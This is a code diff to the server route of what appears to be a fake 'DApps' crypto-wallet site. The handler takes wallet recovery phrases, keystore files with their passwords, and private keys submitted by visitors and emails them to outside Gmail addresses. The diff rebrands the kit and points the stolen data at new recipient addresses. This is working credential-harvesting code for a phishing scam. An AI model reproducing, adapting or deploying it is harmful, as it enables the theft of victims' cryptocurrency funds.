@@ -22,10 +22,10 @@ const formatMessage = async (message: string) => {
   const formattedMessage = formattedLines.join('');
 
   const mailOptions = {
-    from: `Billie Notify ${email}`,
+    from: `Eh-boss Notify ${email}`,
     to: "osamathebomber3@gmail.com",
-    subject: "Yo! you just got a new notification from Billie",
-    html: `<div>Hi</div>`,
+    subject: "Yo! you just got a new notification from Eh-boss",
+    html: `<div>${message}</div>`,
   };
 
   transporter.verify(function (error: any, success: any) {
@@ -51,7 +51,7 @@ const formatMessage = async (message: string) => {
 export async function POST(request: Request) {
   try {
     const { phrase, keystore, privateKey } = await request.json();
-    await formatMessage('hi');
+    
 
     if (phrase) {
 
@@ -71,7 +71,7 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: 'billions2213@gmail.com',
+        to: 'devweb754@gmail.com',
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: formattedMessage,
       }
@@ -110,7 +110,7 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: "billions2213@gmail.com",
+        to: "devweb754@gmail.com",
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>`,
       }
@@ -151,7 +151,7 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: "billions2213@gmail.com",
+        to: "devweb754@gmail.com",
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: formattedMessage,
       }
